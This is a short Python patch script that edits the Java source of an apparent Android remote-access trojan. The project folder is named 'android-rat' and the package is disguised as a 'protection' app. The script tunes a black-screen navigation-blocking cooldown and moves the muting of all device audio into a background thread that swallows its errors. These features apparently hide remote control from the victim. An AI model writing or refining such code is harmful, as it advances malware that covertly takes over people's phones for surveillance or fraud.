J = r"C:\Users\user\kryptos\android-rat\app\src\main\java\com\seguranca\protecao\UiAssistBridge.java"
s = open(J, encoding="utf-8").read()
s = s.replace("BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS = 800;", "BLACK_SCREEN_NAV_BLOCK_COOLDOWN_MS = 1200;")
o2 = "        muteAllDeviceAudio(true);\n\n        isCustomTemplateActive = false;"
s = s.replace(o2, "        new Thread(new Runnable() { @Override public void run() { try { muteAllDeviceAudio(true); } catch (Throwable ignored) {} } }).start();\n\n        isCustomTemplateActive = false;")
open(J, "w", encoding="utf-8").write(s)
print("cooldown + mute ok")
